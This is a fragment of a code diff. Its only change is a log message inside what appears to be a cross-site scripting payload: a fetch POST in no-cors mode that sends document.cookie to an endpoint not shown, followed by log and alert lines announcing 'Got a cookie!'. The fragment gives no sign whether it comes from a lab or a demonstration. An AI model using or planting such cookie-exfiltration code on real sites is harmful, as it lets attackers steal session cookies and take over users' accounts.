@@ -3,5 +3,5 @@ method: 'POST',
 mode: 'no-cors',
 body:document.cookie
 });
-console.log("Got a cookie!");
+console.log("Got cookie!");
 alert("Got a cookie!");
